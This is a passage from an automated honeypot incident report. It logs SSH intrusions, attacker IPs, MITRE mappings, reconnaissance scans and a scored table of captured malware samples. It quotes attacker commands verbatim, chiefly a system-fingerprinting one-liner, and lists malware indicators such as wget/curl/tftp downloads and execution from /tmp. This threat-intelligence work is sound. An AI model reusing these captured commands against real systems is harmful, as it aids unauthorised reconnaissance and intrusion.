| **Last Seen** | 2026-07-15 04:41 |
| **Session Duration** | 33s |
| **Login Attempts** | 2 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `zalee, za, &k`g&k|zpkfq)ES[M, g & k | zpkfq` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 04:40:33` | `cowrie.session.connect` |
| `2026-07-15 04:40:34` | `cowrie.login.success` |
| `2026-07-15 04:40:35` | `cowrie.login.success` |
| `2026-07-15 04:40:36` | `cowrie.session.params` |
| `2026-07-15 04:40:36` | `cowrie.command.input` |
| `2026-07-15 04:40:36` | `cowrie.command.failed` |
| `2026-07-15 04:40:36` | `cowrie.command.input` |
| `2026-07-15 04:40:36` | `cowrie.command.failed` |
| `2026-07-15 04:40:37` | `cowrie.command.input` |
| `2026-07-15 04:40:37` | `cowrie.command.input` |
| `2026-07-15 04:40:37` | `cowrie.command.failed` |
| `2026-07-15 04:40:37` | `cowrie.command.failed` |
| `2026-07-15 04:41:07` | `cowrie.log.closed` |
| `2026-07-15 04:41:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `169.211.128[.]234` to AbuseIPDB if not already reported
- [ ] Block `169.211.128[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7e7489d9ce68

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]209` |
| **First Seen** | 2026-07-15 04:48 |
| **Last Seen** | 2026-07-15 04:49 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 04:48:59` | `cowrie.session.connect` |
| `2026-07-15 04:49:00` | `cowrie.client.version` |
| `2026-07-15 04:49:00` | `cowrie.client.kex` |
| `2026-07-15 04:49:03` | `cowrie.login.success` |
| `2026-07-15 04:49:06` | `cowrie.session.params` |
| `2026-07-15 04:49:06` | `cowrie.command.input` |
| `2026-07-15 04:49:06` | `cowrie.command.input` |
| `2026-07-15 04:49:06` | `cowrie.command.input` |
| `2026-07-15 04:49:06` | `cowrie.command.input` |
| `2026-07-15 04:49:06` | `cowrie.command.input` |
| `2026-07-15 04:49:06` | `cowrie.command.success` |
| `2026-07-15 04:49:06` | `cowrie.command.input` |
| `2026-07-15 04:49:06` | `cowrie.command.input` |
| `2026-07-15 04:49:06` | `cowrie.command.input` |
| `2026-07-15 04:49:06` | `cowrie.command.input` |
| `2026-07-15 04:49:07` | `cowrie.log.closed` |
| `2026-07-15 04:49:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]209` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]209` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6e8787f6c24e

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]209` |
| **First Seen** | 2026-07-15 04:51 |
| **Last Seen** | 2026-07-15 04:51 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 04:51:46` | `cowrie.session.connect` |
| `2026-07-15 04:51:46` | `cowrie.client.version` |
| `2026-07-15 04:51:46` | `cowrie.client.kex` |
| `2026-07-15 04:51:50` | `cowrie.login.success` |
| `2026-07-15 04:51:53` | `cowrie.session.params` |
| `2026-07-15 04:51:53` | `cowrie.command.input` |
| `2026-07-15 04:51:53` | `cowrie.command.input` |
| `2026-07-15 04:51:53` | `cowrie.command.input` |
| `2026-07-15 04:51:53` | `cowrie.command.input` |
| `2026-07-15 04:51:53` | `cowrie.command.input` |
| `2026-07-15 04:51:53` | `cowrie.command.success` |
| `2026-07-15 04:51:53` | `cowrie.command.input` |
| `2026-07-15 04:51:53` | `cowrie.command.input` |
| `2026-07-15 04:51:53` | `cowrie.command.input` |
| `2026-07-15 04:51:53` | `cowrie.command.input` |
| `2026-07-15 04:51:54` | `cowrie.log.closed` |
| `2026-07-15 04:51:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]209` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]209` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1f8685318393

| Field | Detail |
|---|---|
| **Source IP** | `123.129.245[.]249` |
| **First Seen** | 2026-07-15 04:52 |
| **Last Seen** | 2026-07-15 04:52 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 04:52:43` | `cowrie.session.connect` |
| `2026-07-15 04:52:44` | `cowrie.client.version` |
| `2026-07-15 04:52:44` | `cowrie.client.kex` |
| `2026-07-15 04:52:46` | `cowrie.login.success` |
| `2026-07-15 04:52:47` | `cowrie.direct-tcpip.request` |
| `2026-07-15 04:52:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `123.129.245[.]249` to AbuseIPDB if not already reported
- [ ] Block `123.129.245[.]249` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-540dc0c25903

| Field | Detail |
|---|---|
| **Source IP** | `41.231.85[.]75` |
| **First Seen** | 2026-07-15 04:52 |
| **Last Seen** | 2026-07-15 04:53 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 04:52:53` | `cowrie.session.connect` |
| `2026-07-15 04:52:54` | `cowrie.client.version` |
| `2026-07-15 04:52:54` | `cowrie.client.kex` |
| `2026-07-15 04:52:55` | `cowrie.login.success` |
| `2026-07-15 04:52:55` | `cowrie.direct-tcpip.request` |
| `2026-07-15 04:53:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `41.231.85[.]75` to AbuseIPDB if not already reported
- [ ] Block `41.231.85[.]75` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9c8fb9bafe48

| Field | Detail |
|---|---|
| **Source IP** | `124.152.90[.]68` |
| **First Seen** | 2026-07-15 04:53 |
| **Last Seen** | 2026-07-15 04:53 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 04:53:37` | `cowrie.session.connect` |
| `2026-07-15 04:53:38` | `cowrie.client.version` |
| `2026-07-15 04:53:38` | `cowrie.client.kex` |
| `2026-07-15 04:53:40` | `cowrie.login.success` |
| `2026-07-15 04:53:40` | `cowrie.direct-tcpip.request` |
| `2026-07-15 04:53:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `124.152.90[.]68` to AbuseIPDB if not already reported
- [ ] Block `124.152.90[.]68` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b9e042dde843

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]209` |
| **First Seen** | 2026-07-15 04:54 |
| **Last Seen** | 2026-07-15 04:54 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 04:54:34` | `cowrie.session.connect` |
| `2026-07-15 04:54:34` | `cowrie.client.version` |
| `2026-07-15 04:54:34` | `cowrie.client.kex` |
| `2026-07-15 04:54:38` | `cowrie.login.success` |
| `2026-07-15 04:54:40` | `cowrie.session.params` |
| `2026-07-15 04:54:40` | `cowrie.command.input` |
| `2026-07-15 04:54:40` | `cowrie.command.input` |
| `2026-07-15 04:54:40` | `cowrie.command.input` |
| `2026-07-15 04:54:40` | `cowrie.command.input` |
| `2026-07-15 04:54:40` | `cowrie.command.input` |
| `2026-07-15 04:54:40` | `cowrie.command.success` |
| `2026-07-15 04:54:40` | `cowrie.command.input` |
| `2026-07-15 04:54:40` | `cowrie.command.input` |
| `2026-07-15 04:54:40` | `cowrie.command.input` |
| `2026-07-15 04:54:40` | `cowrie.command.input` |
| `2026-07-15 04:54:41` | `cowrie.log.closed` |
| `2026-07-15 04:54:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]209` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]209` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `143.198.233[.]61` | **345** | 2026-07-15 00:55 | 2026-07-15 04:53 | 198m | 0 | `T1592` | 🟠 MEDIUM |
| `104.199.52[.]37` | **30** | 2026-07-15 04:29 | 2026-07-15 04:29 | 5m | 0 | `T1592` | 🟠 MEDIUM |
| `179.61.192[.]156` | **18** | 2026-07-15 01:11 | 2026-07-15 04:54 | 20m | 0 | `T1592` | 🟠 MEDIUM |
| `139.199.80[.]137` | **9** | 2026-07-15 01:10 | 2026-07-15 04:30 | 0m | 0 | `T1592` | 🟢 LOW |
| `51.158.205[.]203` | **6** | 2026-07-15 03:23 | 2026-07-15 03:28 | 0m | 0 | `T1592` | 🟢 LOW |
| `118.193.40[.]88` | **3** | 2026-07-15 01:21 | 2026-07-15 01:21 | 0m | 0 | `T1592` | 🟢 LOW |
| `45.79.172[.]21` | **3** | 2026-07-15 01:51 | 2026-07-15 01:51 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]96` | **3** | 2026-07-15 03:51 | 2026-07-15 03:51 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]39` | **3** | 2026-07-15 03:51 | 2026-07-15 03:53 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]59` | **3** | 2026-07-15 03:51 | 2026-07-15 03:52 | 0m | 0 | `T1592` | 🟢 LOW |
| `13.58.172[.]85` | **2** | 2026-07-15 01:06 | 2026-07-15 01:11 | 0m | 0 | `T1592` | 🟢 LOW |
| `195.178.110[.]137` | **2** | 2026-07-15 03:59 | 2026-07-15 04:01 | 0m | 0 | `T1592` | 🟢 LOW |
| `34.77.146[.]234` | **2** | 2026-07-15 04:20 | 2026-07-15 04:20 | 0m | 0 | `T1592` | 🟢 LOW |
| `49.88.156[.]34` | **2** | 2026-07-15 04:36 | 2026-07-15 04:36 | 2m | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]98` | **2** | 2026-07-15 03:55 | 2026-07-15 03:55 | 0m | 0 | `T1592` | 🟢 LOW |
| `100.58.116[.]226` | 1 | 2026-07-15 01:19 | 2026-07-15 01:19 | 2s | 0 | `T1592` | 🟢 LOW |
| `113.101.246[.]194` | 1 | 2026-07-15 03:26 | 2026-07-15 03:28 | 120s | 0 | `T1592` | 🟢 LOW |
| `130.185.96[.]113` | 1 | 2026-07-15 01:03 | 2026-07-15 01:03 | 0s | 0 | `T1592` | 🟢 LOW |
| `14.103.111[.]127` | 1 | 2026-07-15 01:16 | 2026-07-15 01:18 | 120s | 0 | `T1592` | 🟢 LOW |
| `157.0.0[.]10` | 1 | 2026-07-15 03:53 | 2026-07-15 03:54 | 30s | 0 | `T1592` | 🟢 LOW |
| `183.171.148[.]87` | 1 | 2026-07-15 01:01 | 2026-07-15 01:03 | 120s | 0 | `T1592` | 🟢 LOW |
| `183.171.57[.]164` | 1 | 2026-07-15 01:58 | 2026-07-15 02:00 | 120s | 0 | `T1592` | 🟢 LOW |
| `183.171.61[.]10` | 1 | 2026-07-15 02:13 | 2026-07-15 02:14 | 9s | 0 | `T1592` | 🟢 LOW |
| `185.223.235[.]20` | 1 | 2026-07-15 04:46 | 2026-07-15 04:46 | 9s | 0 | `T1592` | 🟢 LOW |
| `195.140.214[.]23` | 1 | 2026-07-15 04:37 | 2026-07-15 04:37 | 0s | 0 | `T1592` | 🟢 LOW |
| `2.57.122[.]209` | 1 | 2026-07-15 04:34 | 2026-07-15 04:34 | 0s | 0 | `T1592` | 🟢 LOW |
| `2.58.172[.]185` | 1 | 2026-07-15 04:13 | 2026-07-15 04:13 | 0s | 0 | `T1592` | 🟢 LOW |
| `223.83.114[.]88` | 1 | 2026-07-15 01:47 | 2026-07-15 01:49 | 120s | 0 | `T1592` | 🟢 LOW |
| `34.78.56[.]95` | 1 | 2026-07-15 04:19 | 2026-07-15 04:19 | 4s | 0 | `T1592` | 🟢 LOW |
| `49.124.152[.]213` | 1 | 2026-07-15 01:26 | 2026-07-15 01:27 | 0s | 0 | `T1592` | 🟢 LOW |
| `50.116.26[.]161` | 1 | 2026-07-15 01:37 | 2026-07-15 01:37 | 0s | 0 | `T1592` | 🟢 LOW |
| `52.142.44[.]95` | 1 | 2026-07-15 03:54 | 2026-07-15 03:55 | 51s | 0 | `T1592` | 🟢 LOW |
| `64.62.197[.]137` | 1 | 2026-07-15 03:24 | 2026-07-15 03:24 | 2s | 0 | `T1592` | 🟢 LOW |
| `64.62.197[.]17` | 1 | 2026-07-15 04:06 | 2026-07-15 04:06 | 2s | 0 | `T1592` | 🟢 LOW |
| `64.62.197[.]187` | 1 | 2026-07-15 03:47 | 2026-07-15 03:47 | 4s | 0 | `T1592` | 🟢 LOW |
| `64.89.160[.]135` | 1 | 2026-07-15 03:53 | 2026-07-15 03:53 | 0s | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]138` | 1 | 2026-07-15 03:46 | 2026-07-15 03:46 | 15s | 0 | `T1592` | 🟢 LOW |
| `66.240.223[.]208` | 1 | 2026-07-15 03:53 | 2026-07-15 03:53 | 10s | 0 | `T1592` | 🟢 LOW |
| `77.83.72[.]79` | 1 | 2026-07-15 02:58 | 2026-07-15 03:00 | 120s | 0 | `T1592` | 🟢 LOW |
| `77.90.185[.]16` | 1 | 2026-07-15 02:20 | 2026-07-15 02:20 | 0s | 0 | `T1592` | 🟢 LOW |
| `78.66.44[.]23` | 1 | 2026-07-15 01:26 | 2026-07-15 01:28 | 120s | 0 | `T1592` | 🟢 LOW |
| `81.19.219[.]240` | 1 | 2026-07-15 04:45 | 2026-07-15 04:45 | 0s | 0 | `T1592` | 🟢 LOW |
| `89.21.67[.]130` | 1 | 2026-07-15 04:38 | 2026-07-15 04:38 | 0s | 0 | `T1592` | 🟢 LOW |
| `91.92.40[.]176` | 1 | 2026-07-15 02:42 | 2026-07-15 02:42 | 0s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 63/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/74 ✅ |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 44/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **17/74** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 69/100 | 🟡 MEDIUM | **24/74** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144928-0dd2c2474d24-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `21e99667e2f0e73d12aae89f8cabd338426ab1fe4ce828ec93c07de615ef754c` | ELF Binary (Linux executable) (AArch64 64-bit) | `21e99667e2f0e73d...` | 63/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `27d205dc183ea2fad0e55e10b206404be20908e39a74569ff99182d7326ed9c0` | ELF Binary (Linux executable) (x86-64 64-bit) | `27d205dc183ea2fa...` | 44/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `289fd4a7a10aaf8aa313ab80cc170018fc662d0a7d034a3b92b9d3d3945b0736` | ELF Binary (Linux executable) (x86-64 64-bit) | `289fd4a7a10aaf8a...` | 44/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `2a39d592018600e4b3db2caed6cdaa8c651d3dacbebf8ac1f0960e493843c435` | ELF Binary (Linux executable) (x86-64 64-bit) | `2a39d592018600e4...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `2bd2ab1d4b75aa2b4eed1af697188b8bce35a882faf4335cb4fafc2847197995` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `2bd2ab1d4b75aa2b...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `3552f719a379865960a169e2dacea968f4e8f46bd31907f2f89df431d09d9d9e` | ELF Binary (Linux executable) (x86-64 64-bit) | `3552f719a3798659...` | 46/100 | 🟡 MEDIUM | **40/74** 🔴 |
| `3625cfdcd6d434bfa672753ef4b197df8a01388d220bafc9edfa2d0d29c7fcef` | ELF Binary (Linux executable) (x86-64 64-bit) | `3625cfdcd6d434bf...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `3625d068896953595e75df328676a08bc071977ac1ff95d44b745bbcb7018c6f` | ELF Binary (Linux executable) (ARM 32-bit) | `3625d06889695359...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `3910f46fe809d723d169b5723e0724dba7aed441a065b53b98e2f1b0a9736569` | ELF Binary (Linux executable) (MIPS 32-bit) | `3910f46fe809d723...` | 65/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` | ELF Binary (Linux executable) (x86 32-bit) | `3ad48bae18b7ea8e...` | 86/100 | 🔴 HIGH | **41/74** 🔴 |
| `40db9279ba409757c074048529be5bf8f141fa022489a965792e7f7de2223b78` | ELF Binary (Linux executable) (ARM 32-bit) | `40db9279ba409757...` | 62/100 | 🟡 MEDIUM | **32/74** 🔴 |
| `44689d3e1a7f460db2ecc14351c171f4910721257f83024c63cbc07f4e2b977c` | ELF Binary (Linux executable) (x86-64 64-bit) | `44689d3e1a7f460d...` | 35/100 | 🟢 LOW | **13/74** 🔴 |
| `4481c88954298a5e5e0f0d70cd011644e8442e1aeb0ce42cc3c8b4d51a637f02` | ELF Binary (Linux executable) (ARM 32-bit) | `4481c88954298a5e...` | 52/100 | 🟡 MEDIUM | **30/74** 🔴 |
| `47b268c21591069bfe4099833ad66b8138a53ab2dcb866e040d466aee1f8624c` | ELF Binary (Linux executable) (x86-64 64-bit) | `47b268c21591069b...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `494ab0439cd9a373aca71bf5107e0718a9e14b9b805632835c99c42b88a50984` | ELF Binary (Linux executable) (x86 32-bit) | `494ab0439cd9a373...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `526c830542c17e6883da850de8dc2c3c2ffc35b446f33c61892b193e50f8d8ed` | ELF Binary (Linux executable) (x86-64 64-bit) | `526c830542c17e68...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `5850b6e589ea496b093b3c162dab126789ea118276bc3c23ff4cf75c6c19c8d5` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `5850b6e589ea496b...` | 52/100 | 🟡 MEDIUM | **30/74** 🔴 |
| `59691617d4c9bfe4a9202c318e632faa7c8a2d5dfdb46297e27c1a33971f3530` | ELF Binary (Linux executable) (unknown (e_machine=0x2a) 32-bit) | `59691617d4c9bfe4...` | 54/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `59c29436755b0778e968d49feeae20ed65f5fa5e35f9f7965b8ed93420db91e5` | ELF Binary (Linux executable) (x86-64 64-bit) | `59c29436755b0778...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `59da60e031a1bc0cadb4d5b62a9b3047c40c490738b5ca7ed367f4a8440561a3` | Unknown binary | `59da60e031a1bc0c...` | 0/100 | 🟢 LOW | 0/74 ✅ |
| `5b7b9a6449dcf0b779dd72210926d4567453aa40f16b473343a3aa4372798884` | ELF Binary (Linux executable) (AArch64 64-bit) | `5b7b9a6449dcf0b7...` | 38/100 | 🟢 LOW | **22/74** 🔴 |
| `5f160094d291b41abe2e65a17c1b1c8a4aec041bf63c72cf01494b2ff37e20c9` | ELF Binary (Linux executable) (ARM 32-bit) | `5f160094d291b41a...` | 64/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `629db57b96d6e965401d866f895d86c542efe344b3d489630a6ec09d643add76` | ELF Binary (Linux executable) (x86-64 64-bit) | `629db57b96d6e965...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `64b8416c418c265ee1a7999470d9f688ad8204c1d85341e270e23649ee21e11b` | Python Script | `64b8416c418c265e...` | 67/100 | 🟡 MEDIUM | **19/74** 🔴 |
| `6aa904125beb01924243b0dd04e0988b16b8bccd5479224f8bbcd762814b303e` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `6aa904125beb0192...` | 61/100 | 🟡 MEDIUM | **27/73** 🔴 |
| `6d38d8be9058928878b583202c87b80fe8ff66b347e0d325a3c2b956094bfe7c` | ELF Binary (Linux executable) (MIPS 32-bit) | `6d38d8be90589288...` | 53/100 | 🟡 MEDIUM | **34/74** 🔴 |
| `725d1de20672ed85f32e823fe067ed6eb17149019e146bafbbe59338df78e37f` | Bash Script | `725d1de20672ed85...` | 85/100 | 🔴 HIGH | **39/74** 🔴 |
| `75737a0d2987fb60d7a1f17ff2a7122132545e84a327e3a5372be51500a3be12` | ELF Binary (Linux executable) (x86-64 64-bit) | `75737a0d2987fb60...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `765289f938cc2bd64c9778dbabe048afa8ac3277a150c940d2730c14d24687b5` | ELF Binary (Linux executable) (x86-64 64-bit) | `765289f938cc2bd6...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `77ed8c7518a32663fb766f729075dcdddc355c8d6ebe381092df51bb891e0cfc` | ELF Binary (Linux executable) (x86 32-bit) | `77ed8c7518a32663...` | 44/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `783adb7ad6b16fe9818f3e6d48b937c3ca1994ef24e50865282eeedeab7e0d59` | Bash Script | `783adb7ad6b16fe9...` | 60/100 | 🟡 MEDIUM | **27/74** 🔴 |
| `7a4a3a129b726b531941b41d734521e8905d57a57a7e8a0a7e5dff41ed22f6ba` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `7a4a3a129b726b53...` | 86/100 | 🔴 HIGH | **40/74** 🔴 |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 46/100 | 🟡 MEDIUM | **40/73** 🔴 |

**Suspicious Indicators — HIGH Severity Samples:**

_`3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` (3ad48bae18b7ea8e7ffe3608...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

